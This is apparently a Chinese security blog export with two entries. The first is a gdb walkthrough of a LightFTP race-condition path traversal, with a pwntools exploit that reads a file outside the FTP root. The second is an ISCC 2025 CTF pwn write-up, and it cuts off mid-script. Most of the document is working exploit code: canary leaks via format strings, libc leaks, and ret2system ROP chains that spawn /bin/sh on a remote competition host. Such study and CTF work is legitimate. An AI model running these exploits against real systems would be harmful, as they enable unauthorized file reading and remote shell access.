<h4 id="断入ftpUSER"><a href="#断入ftpUSER" class="headerlink" title="断入ftpUSER"></a>断入ftpUSER</h4><p>用户名：<code>anonymous</code>，密码：<code>*</code></p>
<p>输入用户名后回车，回到gdb页面就可以看到gdb中运行到ftpUSER()，如图：</p>
<p><img data-src="/../images/image-20250806154615054.png" alt="image-20250806154615054"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ftpUSER</span><span class="params">(PFTPCONTEXT context, <span class="type">const</span> <span class="type">char</span> *params)</span></span><br><span class="line">&#123;<span class="comment">//在这里传入用户名后，params就是我们的用户名</span></span><br><span class="line">    <span class="keyword">if</span> ( params == <span class="literal">NULL</span> )<span class="comment">//检查是否为空</span></span><br><span class="line">        <span class="keyword">return</span> sendstring(context, error501);</span><br><span class="line"></span><br><span class="line">    context-&gt;Access = FTP_ACCESS_NOT_LOGGED_IN;<span class="comment">//检查路径是否合法，这里是0</span></span><br><span class="line"></span><br><span class="line">    writelogentry(context, <span class="string">&quot; USER: &quot;</span>, (<span class="type">char</span> *)params);<span class="comment">//写一下日志</span></span><br><span class="line">    <span class="built_in">snprintf</span>(context-&gt;FileName, <span class="keyword">sizeof</span>(context-&gt;FileName), <span class="string">&quot;331 User %s OK. Password required\r\n&quot;</span>, params);</span><br><span class="line">    <span class="comment">/*pwndbg&gt; p context -&gt; FileName</span></span><br><span class="line"><span class="comment">	$7 = &quot;331 User anonymous OK. Password required\r\n&quot;, &#x27;\000&#x27; &lt;repeats 8149 times&gt;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    sendstring(context, context-&gt;FileName);<span class="comment">//发送字符串</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Save login name to FileName for the next PASS command */</span></span><br><span class="line">    <span class="built_in">strcpy</span>(context-&gt;FileName, params);<span class="comment">//将用户名cp到context -&gt; FileName中</span></span><br><span class="line">    <span class="comment">/*pwndbg&gt; p context -&gt; FileName</span></span><br><span class="line"><span class="comment">	$10 = &quot;anonymous\000nonymous OK. Password required\r\n&quot;, &#x27;\000&#x27; &lt;repeats 8149 times&gt;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="断入ftpPASS"><a href="#断入ftpPASS" class="headerlink" title="断入ftpPASS"></a>断入ftpPASS</h4><p>还是在源码中加上gdb注释来理解</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ftpPASS</span><span class="params">(PFTPCONTEXT context, <span class="type">const</span> <span class="type">char</span> *params)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>	temptext[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( params == <span class="literal">NULL</span> )<span class="comment">//判断params是否为空</span></span><br><span class="line">        <span class="keyword">return</span> sendstring(context, error501);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(temptext, <span class="number">0</span>, <span class="keyword">sizeof</span>(temptext));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * we have login name saved in context-&gt;FileName from USER command</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (!config_parse(g_cfg.ConfigFile, context-&gt;FileName, <span class="string">&quot;pswd&quot;</span>, temptext, <span class="keyword">sizeof</span>(temptext)))</span><br><span class="line">        <span class="keyword">return</span> sendstring(context, error530_r);<span class="comment">//解析fftp.conf文件中当前用户名对应的pswd字段</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( (<span class="built_in">strcmp</span>(temptext, params) == <span class="number">0</span>) || (temptext[<span class="number">0</span>] == <span class="string">&#x27;*&#x27;</span>) )</span><br><span class="line">    &#123;<span class="comment">/*pwndbg&gt; p temptext</span></span><br><span class="line"><span class="comment">    $1 = &quot;*&quot;, &#x27;\000&#x27; &lt;repeats 254 times&gt;将密码解析到了temptext中</span></span><br><span class="line"><span class="comment">    pwndbg&gt; p params</span></span><br><span class="line"><span class="comment">    $2 = 0x7ffff6f42c45 &quot;*&quot;  </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">        <span class="built_in">memset</span>(context-&gt;RootDir, <span class="number">0</span>, <span class="keyword">sizeof</span>(context-&gt;RootDir));</span><br><span class="line">        <span class="built_in">memset</span>(temptext, <span class="number">0</span>, <span class="keyword">sizeof</span>(temptext));</span><br><span class="line"></span><br><span class="line">        config_parse(g_cfg.ConfigFile, context-&gt;FileName, <span class="string">&quot;root&quot;</span>, context-&gt;RootDir, <span class="keyword">sizeof</span>(context-&gt;RootDir));<span class="comment">//解析根目录在哪个地方</span></span><br><span class="line">        config_parse(g_cfg.ConfigFile, context-&gt;FileName, <span class="string">&quot;accs&quot;</span>, temptext, <span class="keyword">sizeof</span>(temptext));</span><br><span class="line">		<span class="comment">//解析访问的权限是多少</span></span><br><span class="line">        context-&gt;Access = FTP_ACCESS_NOT_LOGGED_IN;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( strcasecmp(temptext, <span class="string">&quot;admin&quot;</span>) == <span class="number">0</span> ) &#123;</span><br><span class="line">                context-&gt;Access = FTP_ACCESS_FULL;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( strcasecmp(temptext, <span class="string">&quot;upload&quot;</span>) == <span class="number">0</span> ) &#123;</span><br><span class="line">                context-&gt;Access = FTP_ACCESS_CREATENEW;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( strcasecmp(temptext, <span class="string">&quot;readonly&quot;</span>) == <span class="number">0</span> ) &#123;</span><br><span class="line">                context-&gt;Access = FTP_ACCESS_READONLY;</span><br><span class="line">                <span class="keyword">break</span>;<span class="comment">//设置一下权限只读</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> sendstring(context, error530_b);</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        writelogentry(context, <span class="string">&quot; PASS-&gt;successful logon&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> sendstring(context, error530_r);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sendstring(context, success230);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里可以再次输入时，执行<code>PASV</code></p>
<h4 id="断在ftpRETR"><a href="#断在ftpRETR" class="headerlink" title="断在ftpRETR"></a>断在ftpRETR</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root:~/ <span class="comment"># ftp 0.0.0.0 </span></span><br><span class="line">Connected to 0.0.0.0.</span><br><span class="line">220 LightFTP server ready</span><br><span class="line">Name (0.0.0.0:root): anonymous</span><br><span class="line">331 User anonymous OK. Password required</span><br><span class="line">Password:</span><br><span class="line">230 User logged <span class="keyword">in</span>, proceed.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; <span class="built_in">ls</span>  <span class="comment">#ls时会产生相应的日志</span></span><br><span class="line">229 Entering Extended Passive Mode (|||23091|)</span><br><span class="line">150 File status okay; about to open data connection.</span><br><span class="line">-rw-r--r--  1 1000 1000 9 Aug 05 19:41 demo</span><br><span class="line">226 Transfer complete. Closing data connection.</span><br><span class="line">ftp&gt; get demo</span><br><span class="line"><span class="built_in">local</span>: demo remote: demo</span><br><span class="line">229 Entering Extended Passive Mode (|||33242|)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>执行<code>get demo</code>后gdb即可进入到ftpRETR()中</p>
<p>在gdb中执行过<code>ftp_effective_path(context-&gt;RootDir, context-&gt;CurrentDir, params, sizeof(context-&gt;FileName), context-&gt;FileName);</code>这里时查看文件路径变量的变化</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p context -&gt; FileName</span><br><span class="line"><span class="variable">$2</span> = <span class="string">&quot;/home/le0n/study/ftp/LightFTP-2.2/Bin/ftpshare/demo&quot;</span>, <span class="string">&#x27;\000&#x27;</span> &lt;repeats 8140 <span class="built_in">times</span>&gt;</span><br><span class="line"><span class="comment">#这里把文件名放到根目录后面了，这个就保证了即使是../demo也不会跃出这个根目录（ftpshare）</span></span><br><span class="line">pwndbg&gt; p context -&gt; RootDir</span><br><span class="line"><span class="variable">$3</span> = <span class="string">&quot;/home/le0n/study/ftp/LightFTP-2.2/Bin/ftpshare&quot;</span>, <span class="string">&#x27;\000&#x27;</span> &lt;repeats 4049 <span class="built_in">times</span>&gt;</span><br><span class="line">pwndbg&gt; p params</span><br><span class="line"><span class="variable">$4</span> = 0x7ffff6f42c45 <span class="string">&quot;demo&quot;</span></span><br></pre></td></tr></table></figure>

<p>且这个ftp_effective_path()函数是没有问题的，还可以保证它没有问题</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">while</span> (stat(context-&gt;FileName, &amp;filestats) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( S_ISDIR(filestats.st_mode) )<span class="comment">//检查文件是否存在</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        sendstring(context, interm150);</span><br><span class="line">        writelogentry(context, <span class="string">&quot; RETR: &quot;</span>, (<span class="type">char</span> *)params);</span><br><span class="line">        context-&gt;WorkerThreadAbort = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        pthread_mutex_lock(&amp;context-&gt;MTLock);</span><br><span class="line"></span><br><span class="line">        context-&gt;WorkerThreadValid = pthread_create(&amp;tid, <span class="literal">NULL</span>, (<span class="type">void</span> * (*)(<span class="type">void</span> *))retr_thread, context);<span class="comment">//前面存在的情况下就通过retr_thread这个线程</span></span><br><span class="line">        <span class="comment">//这里 b retr_thread ;c跟进</span></span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sendstring(context, error550);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入retr_thread单步执行到while循环处</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">retr_thread</span><span class="params">(PFTPCONTEXT context)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    buffer = <span class="built_in">malloc</span>(TRANSMIT_BUFFER_SIZE);</span><br><span class="line">    <span class="keyword">while</span> (buffer != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        clientsocket = create_datasocket(context);</span><br><span class="line">        <span class="comment">//在这里执行si，进入create_datasocket()</span></span><br><span class="line">        <span class="comment">//si不行的话，就在这之前b create_datasocket然后跟进</span></span><br></pre></td></tr></table></figure>

<p>跟进后执行到switch语句处，可以看到这里进入了主动模式</p>
<p><img data-src="/../images/image-20250806175957897.png" alt="image-20250806175957897"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">switch</span> ( context-&gt;Mode ) &#123;</span><br><span class="line">    <span class="keyword">case</span> MODE_NORMAL:<span class="comment">//在主动模式下走的是这里</span></span><br><span class="line">            <span class="comment">//创建一个套接字</span></span><br><span class="line">        clientsocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">        context-&gt;DataSocket = clientsocket;</span><br><span class="line">        <span class="keyword">if</span> ( clientsocket == INVALID_SOCKET )</span><br><span class="line">            <span class="keyword">return</span> INVALID_SOCKET;</span><br><span class="line"></span><br><span class="line">        laddr.sin_family = AF_INET;</span><br><span class="line">        laddr.sin_port = context-&gt;DataPort;</span><br><span class="line">        laddr.sin_addr.s_addr = context-&gt;DataIPv4;</span><br><span class="line">            <span class="comment">//开放一个端口主动向用户发起连接，n 步过</span></span><br><span class="line">        <span class="keyword">if</span> ( connect(clientsocket, (<span class="type">const</span> <span class="keyword">struct</span> sockaddr *)&amp;laddr, <span class="keyword">sizeof</span>(laddr)) == <span class="number">-1</span> ) &#123;</span><br><span class="line">            close(clientsocket);</span><br><span class="line">            <span class="keyword">return</span> INVALID_SOCKET;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> MODE_PASSIVE:</span><br><span class="line">        asz = <span class="keyword">sizeof</span>(laddr);</span><br><span class="line">        clientsocket = accept(context-&gt;DataSocket, (<span class="keyword">struct</span> sockaddr *)&amp;laddr, &amp;asz);</span><br><span class="line">        close(context-&gt;DataSocket);</span><br><span class="line">        context-&gt;DataSocket = clientsocket;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( clientsocket == INVALID_SOCKET )</span><br><span class="line">            <span class="keyword">return</span> INVALID_SOCKET;</span><br><span class="line"></span><br><span class="line">        context-&gt;DataIPv4 = <span class="number">0</span>;</span><br><span class="line">        context-&gt;DataPort = <span class="number">0</span>;</span><br><span class="line">        context-&gt;Mode = MODE_NORMAL;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> INVALID_SOCKET;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> clientsocket;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后程序就会回到retr_thread线程中，open()文件读取到缓冲区，然后发送给用户。</p>
<p>这基本就是ftp主动模式完整流程.</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="触发漏洞"><a href="#触发漏洞" class="headerlink" title="触发漏洞"></a>触发漏洞</h4><p>这里我们用python的pwn库进行交互，接下来需要用到三个终端页面（1，2，3）</p>
<p>在bin目录下写exp.py进行测试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_code</span>(<span class="params">code</span>):</span><br><span class="line">    p.sendline(code+<span class="string">&quot;\r&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">21</span>)</span><br><span class="line">send_code(<span class="string">&quot;USER anonymous&quot;</span>)</span><br><span class="line">send_code(<span class="string">&quot;PASS *&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>在终端1以root权限gdb启动<code>./fftp</code>，再回到终端2执行这个exp.py，登陆上即测试成功</p>
<p>在根目录下创建一个flag，这是我们越界的目标，最终exp如下：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_code</span>(<span class="params">code</span>):</span><br><span class="line">    p.sendline(code+<span class="string">&quot;\r&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">21</span>)</span><br><span class="line">send_code(<span class="string">&quot;USER anonymous&quot;</span>)</span><br><span class="line">send_code(<span class="string">&quot;PASS *&quot;</span>)</span><br><span class="line"><span class="comment">#在请求文件之前开启被动模式</span></span><br><span class="line">send_code(<span class="string">&quot;PASV&quot;</span>)</span><br><span class="line">send_code(<span class="string">&quot;RETR demo&quot;</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">send_code(<span class="string">&quot;USER /flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>开始调试触发漏洞</p>
<ol>
<li>在终端1中以root权限gdb .&#x2F;fftp，并在retr_thread处下断点<code>b retr_thread</code>，然后<code>r</code>运行起来</li>
</ol>
<p>如图：</p>
<p><img data-src="/../images/image-20250806192906694.png" alt="image-20250806192906694"></p>
<ol start="2">
<li>来到终端2，运行exp.py，再回到终端1进行调试，</li>
</ol>
<p><img data-src="/../images/image-20250806193743733.png" alt="image-20250806193743733"></p>
<p>一直走到这个<code>create_datasocket</code>这个位置，再回车一下程序会发生阻塞。</p>
<p>然后回到终端2中回车使exp.py继续运行</p>
<p><img data-src="/../images/image-20250806193901353.png" alt="image-20250806193901353"></p>
<p>我们可以发现图中有一个<code>127.0.0.1 189 155</code>这里的189，155给他转为十六进制为BD、9B(每次程序运行都可能不一样)拼接在一起得到一个十进制数：48539。</p>
<ol start="3">
<li>在终端3中执行 nc 127.0.0.1 48539，这时我们再回到终端1可以发现gdb程序跳出阻塞</li>
</ol>
<p>在gdb中继续单步步过程序</p>
<p><img data-src="/../images/image-20250806194646768.png" alt="image-20250806194646768"></p>
<p>执行<code>p *context</code>就可以看到 context-&gt;FileName 中的内容变为<code>/flag</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p *context</span><br><span class="line"><span class="variable">$1</span> = &#123;</span><br><span class="line">  ...</span><br><span class="line">  CurrentDir = <span class="string">&quot;/&quot;</span>, <span class="string">&#x27;\000&#x27;</span> &lt;repeats 4094 <span class="built_in">times</span>&gt;,</span><br><span class="line">  RootDir = <span class="string">&quot;/home/le0n/study/ftp/LightFTP-2.2/Bin/ftpshare&quot;</span>, <span class="string">&#x27;\000&#x27;</span> &lt;repeats 4049 <span class="built_in">times</span>&gt;,</span><br><span class="line">  RnFrom = <span class="string">&#x27;\000&#x27;</span> &lt;repeats 4095 <span class="built_in">times</span>&gt;,</span><br><span class="line">  FileName = <span class="string">&quot;/flag\000er /flag OK. Password required\r\n\000tpshare/demo&quot;</span>, <span class="string">&#x27;\000&#x27;</span> &lt;repeats 8140 <span class="built_in">times</span>&gt;,</span><br><span class="line">  TLS_session = 0x0,</span><br><span class="line">  Stats = &#123;</span><br><span class="line">    DataRx = 0,</span><br><span class="line">    DataTx = 0,</span><br><span class="line">    FilesRx = 0,</span><br><span class="line">    FilesTx = 0</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>在gdb中执行<code>c</code>，再回到终端3中就可以看到在主机根目录下的flag</li>
</ol>
<p><img data-src="/../images/image-20250806194325263.png" alt="image-20250806194325263"></p>
<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a><strong>原理</strong></h4><p>在程序阻塞时通过nc这个等待连接的端口使程序可以继续运行，但在退出阻塞继续运行之前通过<code>USER /flag</code>使context-&gt;FileName中的内容发生了改变（条件竞争），也就是在程序在等待（阻塞）时运行了<code>USER /flag</code>在ftpUSER中snprintf()之前有没有检查就导致了这个函数成功运行修改了context-&gt;FileName中的内容，又有一个访问使程序退出阻塞正常运行就可以进行路径穿越任意读取了。</p>
<h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><ol>
<li>在程序阻塞处恢复运行后对于<code>context-&gt;FileName</code>加检查</li>
<li>在context中添加字段使ftpUSER中的snprintf()的对象不为FileName，或者rter_thread线程中的对象不为FilrName</li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在实际的漏洞挖掘中要能耐心的啃代码，看透代码的功能并十分了解，注意一些全局变量</p>
]]></content>
      <categories>
        <category>FTP</category>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>FTP</tag>
      </tags>
  </entry>
  <entry>
    <title>2025 iscc</title>
    <url>/2025/05/21/2025iscc/</url>
    <content><![CDATA[<h1 id="练武"><a href="#练武" class="headerlink" title="练武"></a>练武</h1><h2 id="签"><a href="#签" class="headerlink" title="签"></a>签</h2><p>通过两个函数地址确定libc版本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-05-01 09:46:21</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;101.200.155.151&#x27;</span>,<span class="number">12400</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"><span class="comment">#libc = elf.libc</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc6-i386_2.35-0ubuntu3.8_amd64.so&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; -&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">hs256   = <span class="keyword">lambda</span> data               :sha256(<span class="built_in">str</span>(data).encode()).hexdigest()</span><br><span class="line">l32     = <span class="keyword">lambda</span>                    :u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">l64     = <span class="keyword">lambda</span>                    :u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data               :<span class="built_in">int</span>(data, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;--%23$p&#x27;</span></span><br><span class="line">ru(<span class="string">b&quot;What&#x27;s your name?&quot;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"><span class="comment">#--0xeb2ff800 </span></span><br><span class="line">ru(<span class="string">b&#x27;--&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(r(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="comment">###</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">vuln = <span class="number">0x08049210</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x4c</span>-<span class="number">0xc</span>) + p32(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xc</span> + p32(puts_plt) + p32(vuln) + p32(puts_got)</span><br><span class="line">ru(<span class="string">b&quot;What&#x27;s your password?\n&quot;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">puts_addr = l32()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base +  <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line"><span class="comment">###</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;++%20$p--%23$p&#x27;</span></span><br><span class="line">ru(<span class="string">b&quot;What&#x27;s your name?\n&quot;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"><span class="comment">###</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x4c</span>-<span class="number">0xc</span>) + p32(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xc</span> + p32(system) + p32(<span class="number">0</span>) + p32(bin_sh)</span><br><span class="line">ru(<span class="string">b&quot;What&#x27;s your password?\n&quot;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>



<h2 id="key"><a href="#key" class="headerlink" title="key"></a>key</h2><p>UAF + ret2libc 栈平衡</p>
<p>思路：</p>
<ul>
<li>将释放的chunk再申请回来，并输入flag即可进入到漏洞处</li>
<li>在第一个write处堆溢出一字节覆盖canary的\x00，使它能够被printf打印出来</li>
<li>然后正常打ret2libc，调用system需要栈平衡</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-05-01 13:39:08</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;101.200.155.151&#x27;</span>,<span class="number">12200</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"><span class="comment">#libc = elf.libc</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;attachment-8.so&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; -&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">hs256   = <span class="keyword">lambda</span> data               :sha256(<span class="built_in">str</span>(data).encode()).hexdigest()</span><br><span class="line">l32     = <span class="keyword">lambda</span>                    :u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">l64     = <span class="keyword">lambda</span>                    :u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data               :<span class="built_in">int</span>(data, 